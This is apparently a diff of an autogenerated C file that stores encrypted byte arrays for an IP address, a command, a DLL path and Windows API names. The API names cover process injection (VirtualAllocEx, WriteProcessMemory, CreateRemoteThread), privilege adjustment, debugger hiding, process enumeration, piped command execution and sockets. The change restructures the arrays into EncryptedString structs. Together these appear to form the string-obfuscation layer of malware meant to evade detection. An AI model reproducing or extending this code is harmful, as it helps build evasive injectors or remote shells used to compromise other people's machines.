@@ -1,98 +1,194 @@
 #include "encrypted_strings_autogen.h"
 
-unsigned char str_ip[] = { 86, 81, 119, 51, 105, 62, 107, 116, 105, 23, 77 };
-size_t str_ip_len = sizeof(str_ip);
+unsigned char str_ip_data[] = { 100, 229, 229, 225, 251, 228, 249, 230, 251, 229, 215 };
+EncryptedString str_ip = {
+    str_ip_data,
+    sizeof(str_ip_data)
+};
 
-unsigned char str_cmd[] = { 3, 3, 40, 96, 105, 107, 61, 33, 103, 9, 14, 84 };
-size_t str_cmd_len = sizeof(str_cmd);
+unsigned char str_cmd_data[] = { 19, 183, 186, 178, 251, 177, 175, 179, 245, 251, 148, 214 };
+EncryptedString str_cmd = {
+    str_cmd_data,
+    sizeof(str_cmd_data)
+};
 
-unsigned char str_dllPath[] = { 53, 35, 127, 88, 18, 125, 32, 54, 52, 122, 57, 53, 11, 57, 125, 16, 3, 35, 54, 47, 55, 105, 37, 24, 16, 95, 31, 111, 20, 118, 0, 23, 34, 18, 6, 120, 8, 103, 14, 22, 22, 18, 41, 100, 113, 114, 81, 28, 34, 4, 48, 35, 11, 69, 41, 59, 38, 13, 87, 37, 63, 8, 41, 24, 43, 84 };
-size_t str_dllPath_len = sizeof(str_dllPath);
+unsigned char str_dllPath_data[] = { 57, 151, 237, 138, 128, 167, 178, 164, 166, 136, 163, 183, 185, 227, 239, 138, 209, 185, 164, 189, 185, 189, 231, 202, 130, 169, 141, 189, 134, 180, 254, 149, 176, 168, 148, 190, 186, 189, 156, 132, 148, 128, 139, 174, 227, 192, 187, 146, 176, 214, 130, 249, 169, 159, 251, 177, 148, 247, 165, 151, 237, 184, 155, 186, 185, 156 };
+EncryptedString str_dllPath = {
+    str_dllPath_data,
+    sizeof(str_dllPath_data)
+};
 
-unsigned char str_socket[] = { 74, 19, 42, 103, 44, 107, 49, 68 };
-size_t str_socket_len = sizeof(str_socket);
+unsigned char str_socket_data[] = { 36, 167, 184, 181, 190, 177, 163, 214 };
+EncryptedString str_socket = {
+    str_socket_data,
+    sizeof(str_socket_data)
+};
 
-unsigned char str_NtSetInformationThread[] = { 9, 46, 49, 87, 34, 122, 12, 42, 33, 73, 63, 57, 6, 122, 44, 35, 41, 18, 45, 54, 38, 103, 49, 68 };
-size_t str_NtSetInformationThread_len = sizeof(str_NtSetInformationThread);
+unsigned char str_NtSetInformationThread_data[] = { 72, 154, 163, 133, 176, 160, 158, 184, 179, 187, 165, 187, 180, 160, 190, 185, 251, 136, 191, 164, 168, 179, 243, 150 };
+EncryptedString str_NtSetInformationThread = {
+    str_NtSetInformationThread_data,
+    sizeof(str_NtSetInformationThread_data)
+};
 
-unsigned char str_GetCurrentThread[] = { 117, 39, 32, 112, 4, 123, 55, 54, 34, 72, 57, 0, 15, 124, 32, 45, 35, 70 };
-size_t str_GetCurrentThread_len = sizeof(str_GetCurrentThread);
+unsigned char str_GetCurrentThread_data[] = { 31, 147, 178, 162, 150, 161, 165, 164, 176, 186, 163, 130, 189, 166, 178, 183, 241, 220 };
+EncryptedString str_GetCurrentThread = {
+    str_GetCurrentThread_data,
+    sizeof(str_GetCurrentThread_data)
+};
 
-unsigned char str_Sleep[] = { 47, 51, 41, 97, 34, 126, 69 };
-size_t str_Sleep_len = sizeof(str_Sleep);
+unsigned char str_Sleep_data[] = { 40, 135, 187, 179, 176, 164, 215 };
+EncryptedString str_Sleep = {
+    str_Sleep_data,
+    sizeof(str_Sleep_data)
+};
 
-unsigned char str_OpenProcess[] = { 62, 47, 53, 97, 41, 94, 55, 43, 36, 67, 62, 39, 103 };
-size_t str_OpenProcess_len = sizeof(str_OpenProcess);
+unsigned char str_OpenProcess_data[] = { 62, 155, 167, 179, 187, 132, 165, 185, 182, 177, 164, 165, 213 };
+EncryptedString str_OpenProcess = {
+    str_OpenProcess_data,
+    sizeof(str_OpenProcess_data)
+};
 
-unsigned char str_VirtualAllocEx[] = { 80, 54, 44, 118, 51, 123, 36, 40, 6, 74, 33, 59, 4, 75, 61, 76 };
-size_t str_VirtualAllocEx_len = sizeof(str_VirtualAllocEx);
+unsigned char str_VirtualAllocEx_data[] = { 28, 130, 190, 164, 161, 161, 182, 186, 148, 184, 187, 185, 182, 145, 175, 214 };
+EncryptedString str_VirtualAllocEx = {
+    str_VirtualAllocEx_data,
+    sizeof(str_VirtualAllocEx_data)
+};
 
-unsigned char str_WriteProcessMemory[] = { 15, 55, 55, 109, 51, 107, 21, 54, 40, 69, 40, 39, 20, 67, 32, 33, 40, 52, 60, 68 };
-size_t str_WriteProcessMemory_len = sizeof(str_WriteProcessMemory);
+unsigned char str_WriteProcessMemory_data[] = { 24, 131, 165, 191, 161, 177, 135, 164, 186, 183, 178, 165, 166, 153, 178, 187, 250, 174, 174, 214 };
+EncryptedString str_WriteProcessMemory = {
+    str_WriteProcessMemory_data,
+    sizeof(str_WriteProcessMemory_data)
+};
 
-unsigned char str_LoadLibraryA[] = { 43, 44, 42, 101, 35, 66, 44, 38, 53, 71, 63, 45, 38, 14 };
-size_t str_LoadLibraryA_len = sizeof(str_LoadLibraryA);
+unsigned char str_LoadLibraryA_data[] = { 66, 152, 184, 183, 177, 152, 190, 180, 167, 181, 165, 175, 148, 212 };
+EncryptedString str_LoadLibraryA = {
+    str_LoadLibraryA_data,
+    sizeof(str_LoadLibraryA_data)
+};
 
-unsigned char str_CreateRemoteThread[] = { 57, 35, 55, 97, 38, 122, 32, 22, 34, 75, 34, 32, 2, 90, 45, 62, 34, 39, 33, 68 };
-size_t str_CreateRemoteThread_len = sizeof(str_CreateRemoteThread);
+unsigned char str_CreateRemoteThread_data[] = { 71, 151, 165, 179, 180, 160, 178, 132, 176, 185, 184, 162, 176, 128, 191, 164, 240, 189, 179, 214 };
+EncryptedString str_CreateRemoteThread = {
+    str_CreateRemoteThread_data,
+    sizeof(str_CreateRemoteThread_data)
+};
 
-unsigned char str_CloseHandle[] = { 109, 35, 41, 107, 52, 107, 13, 37, 41, 66, 33, 49, 103 };
-size_t str_CloseHandle_len = sizeof(str_CloseHandle);
+unsigned char str_CloseHandle_data[] = { 112, 151, 187, 185, 166, 177, 159, 183, 187, 176, 187, 179, 213 };
+EncryptedString str_CloseHandle = {
+    str_CloseHandle_data,
+    sizeof(str_CloseHandle_data)
+};
 
-unsigned char str_LookupPrivilegeValueA[] = { 101, 44, 42, 107, 44, 123, 53, 20, 53, 79, 59, 61, 11, 107, 34, 41, 17, 39, 41, 49, 38, 71, 85 };
-size_t str_LookupPrivilegeValueA_len = sizeof(str_LookupPrivilegeValueA);
+unsigned char str_LookupPrivilegeValueA_data[] = { 17, 152, 184, 185, 190, 161, 167, 134, 167, 189, 161, 191, 185, 177, 176, 179, 195, 189, 187, 163, 168, 147, 151 };
+EncryptedString str_LookupPrivilegeValueA = {
+    str_LookupPrivilegeValueA_data,
+    sizeof(str_LookupPrivilegeValueA_data)
+};
 
-unsigned char str_GetLastError[] = { 110, 39, 32, 112, 11, 111, 54, 48, 2, 84, 63, 59, 21, 14 };
-size_t str_GetLastError_len = sizeof(str_GetLastError);
+unsigned char str_GetLastError_data[] = { 102, 147, 178, 162, 153, 181, 164, 162, 144, 166, 165, 185, 167, 212 };
+EncryptedString str_GetLastError = {
+    str_GetLastError_data,
+    sizeof(str_GetLastError_data)
+};
 
-unsigned char str_AdjustTokenPrivileges[] = { 53, 33, 33, 110, 50, 125, 49, 16, 40, 77, 40, 58, 55, 124, 44, 58, 46, 42, 32, 35, 38, 117, 85 };
-size_t str_AdjustTokenPrivileges_len = sizeof(str_AdjustTokenPrivileges);
+unsigned char str_AdjustTokenPrivileges_data[] = { 53, 149, 179, 188, 160, 167, 163, 130, 186, 191, 178, 184, 133, 166, 190, 160, 252, 176, 178, 177, 168, 161, 151 };
+EncryptedString str_AdjustTokenPrivileges = {
+    str_AdjustTokenPrivileges_data,
+    sizeof(str_AdjustTokenPrivileges_data)
+};
 
-unsigned char str_OpenProcessToken[] = { 75, 47, 53, 97, 41, 94, 55, 43, 36, 67, 62, 39, 51, 97, 46, 41, 41, 70 };
-size_t str_OpenProcessToken_len = sizeof(str_OpenProcessToken);
+unsigned char str_OpenProcessToken_data[] = { 50, 155, 167, 179, 187, 132, 165, 185, 182, 177, 164, 165, 129, 187, 188, 179, 251, 220 };
+EncryptedString str_OpenProcessToken = {
+    str_OpenProcessToken_data,
+    sizeof(str_OpenProcessToken_data)
+};
 
-unsigned char str_GetCurrentProcess[] = { 77, 39, 32, 112, 4, 123, 55, 54, 34, 72, 57, 4, 21, 97, 38, 41, 52, 53, 69 };
-size_t str_GetCurrentProcess_len = sizeof(str_GetCurrentProcess);
+unsigned char str_GetCurrentProcess_data[] = { 77, 147, 178, 162, 150, 161, 165, 164, 176, 186, 163, 134, 167, 187, 180, 179, 230, 175, 215 };
+EncryptedString str_GetCurrentProcess = {
+    str_GetCurrentProcess_data,
+    sizeof(str_GetCurrentProcess_data)
+};
 
-unsigned char str_CreateToolhelp32Snapshot[] = { 39, 35, 55, 97, 38, 122, 32, 16, 40, 73, 33, 60, 2, 98, 53, 127, 117, 21, 43, 37, 51, 117, 61, 43, 51, 48 };
-size_t str_CreateToolhelp32Snapshot_len = sizeof(str_CreateToolhelp32Snapshot);
+unsigned char str_CreateToolhelp32Snapshot_data[] = { 53, 151, 165, 179, 180, 160, 178, 130, 186, 187, 187, 190, 176, 184, 167, 229, 167, 143, 185, 183, 189, 161, 255, 249, 161, 198 };
+EncryptedString str_CreateToolhelp32Snapshot = {
+    str_CreateToolhelp32Snapshot_data,
+    sizeof(str_CreateToolhelp32Snapshot_data)
+};
 
-unsigned char str_Process32First[] = { 42, 48, 55, 107, 36, 107, 54, 55, 116, 20, 11, 61, 21, 125, 49, 76 };
-size_t str_Process32First_len = sizeof(str_Process32First);
+unsigned char str_Process32First_data[] = { 89, 132, 165, 185, 182, 177, 164, 165, 230, 230, 145, 191, 167, 167, 163, 214 };
+EncryptedString str_Process32First = {
+    str_Process32First_data,
+    sizeof(str_Process32First_data)
+};
 
-unsigned char str_Process32Next[] = { 18, 48, 55, 107, 36, 107, 54, 55, 116, 20, 3, 49, 31, 122, 69 };
-size_t str_Process32Next_len = sizeof(str_Process32Next);
+unsigned char str_Process32Next_data[] = { 111, 132, 165, 185, 182, 177, 164, 165, 230, 230, 153, 179, 173, 160, 215 };
+EncryptedString str_Process32Next = {
+    str_Process32Next_data,
+    sizeof(str_Process32Next_data)
+};
 
-unsigned char str_CreatePipe[] = { 90, 35, 55, 97, 38, 122, 32, 20, 46, 86, 40, 84 };
-size_t str_CreatePipe_len = sizeof(str_CreatePipe);
+unsigned char str_CreatePipe_data[] = { 22, 151, 165, 179, 180, 160, 178, 134, 188, 164, 178, 214 };
+EncryptedString str_CreatePipe = {
+    str_CreatePipe_data,
+    sizeof(str_CreatePipe_data)
+};
 
-unsigned char str_SetHandleInformation[] = { 110, 51, 32, 112, 15, 111, 43, 32, 43, 67, 4, 58, 1, 97, 55, 33, 38, 50, 44, 43, 45, 6 };
-size_t str_SetHandleInformation_len = sizeof(str_SetHandleInformation);
+unsigned char str_SetHandleInformation_data[] = { 88, 135, 178, 162, 157, 181, 185, 178, 185, 177, 158, 184, 179, 187, 165, 187, 244, 168, 190, 185, 163, 210 };
+EncryptedString str_SetHandleInformation = {
+    str_SetHandleInformation_data,
+    sizeof(str_SetHandleInformation_data)
+};
 
-unsigned char str_ReadFile[] = { 14, 50, 32, 101, 35, 72, 44, 40, 34, 38 };
-size_t str_ReadFile_len = sizeof(str_ReadFile);
+unsigned char str_ReadFile_data[] = { 25, 134, 178, 183, 177, 146, 190, 186, 176, 212 };
+EncryptedString str_ReadFile = {
+    str_ReadFile_data,
+    sizeof(str_ReadFile_data)
+};
 
-unsigned char str_FormatMessageA[] = { 33, 38, 42, 118, 42, 111, 49, 9, 34, 85, 62, 53, 0, 107, 4, 76 };
-size_t str_FormatMessageA_len = sizeof(str_FormatMessageA);
+unsigned char str_FormatMessageA_data[] = { 7, 146, 184, 164, 184, 181, 163, 155, 176, 167, 164, 183, 178, 177, 150, 214 };
+EncryptedString str_FormatMessageA = {
+    str_FormatMessageA_data,
+    sizeof(str_FormatMessageA_data)
+};
 
-unsigned char str_LocalFree[] = { 84, 44, 42, 103, 38, 98, 3, 54, 34, 67, 77 };
-size_t str_LocalFree_len = sizeof(str_LocalFree);
+unsigned char str_LocalFree_data[] = { 16, 152, 184, 181, 180, 184, 145, 164, 176, 177, 215 };
+EncryptedString str_LocalFree = {
+    str_LocalFree_data,
+    sizeof(str_LocalFree_data)
+};
 
-unsigned char str_CreateProcessA[] = { 111, 35, 55, 97, 38, 122, 32, 20, 53, 73, 46, 49, 20, 125, 4, 76 };
-size_t str_CreateProcessA_len = sizeof(str_CreateProcessA);
+unsigned char str_CreateProcessA_data[] = { 32, 151, 165, 179, 180, 160, 178, 134, 167, 187, 180, 179, 166, 167, 150, 214 };
+EncryptedString str_CreateProcessA = {
+    str_CreateProcessA_data,
+    sizeof(str_CreateProcessA_data)
+};
 
-unsigned char str_kernel32[] = { 79, 11, 32, 118, 41, 107, 41, 119, 117, 8, 41, 56, 11, 14 };
-size_t str_kernel32_len = sizeof(str_kernel32);
+unsigned char str_kernel32_data[] = { 107, 191, 178, 164, 187, 177, 187, 229, 231, 250, 179, 186, 185, 212 };
+EncryptedString str_kernel32 = {
+    str_kernel32_data,
+    sizeof(str_kernel32_data)
+};
 
-unsigned char str_ntdll[] = { 41, 14, 49, 96, 43, 98, 107, 32, 43, 74, 77 };
-size_t str_ntdll_len = sizeof(str_ntdll);
+unsigned char str_ntdll_data[] = { 31, 186, 163, 178, 185, 184, 249, 178, 185, 184, 215 };
+EncryptedString str_ntdll = {
+    str_ntdll_data,
+    sizeof(str_ntdll_data)
+};
 
-unsigned char str_advapi32[] = { 82, 1, 33, 114, 38, 126, 44, 119, 117, 8, 41, 56, 11, 14 };
-size_t str_advapi32_len = sizeof(str_advapi32);
+unsigned char str_advapi32_data[] = { 99, 181, 179, 160, 180, 164, 190, 229, 231, 250, 179, 186, 185, 212 };
+EncryptedString str_advapi32 = {
+    str_advapi32_data,
+    sizeof(str_advapi32_data)
+};
 
-unsigned char str_ws2_32[] = { 72, 23, 54, 54, 24, 61, 119, 106, 35, 74, 33, 84 };
-size_t str_ws2_32_len = sizeof(str_ws2_32);
+unsigned char str_ws2_32_data[] = { 13, 163, 164, 228, 138, 231, 229, 248, 177, 184, 187, 214 };
+EncryptedString str_ws2_32 = {
+    str_ws2_32_data,
+    sizeof(str_ws2_32_data)
+};
 
-unsigned char str_user32[] = { 23, 21, 54, 97, 53, 61, 119, 106, 35, 74, 33, 84 };
-size_t str_user32_len = sizeof(str_user32);
+unsigned char str_user32_data[] = { 92, 161, 164, 179, 167, 231, 229, 248, 177, 184, 187, 214 };
+EncryptedString str_user32 = {
+    str_user32_data,
+    sizeof(str_user32_data)
+};
 
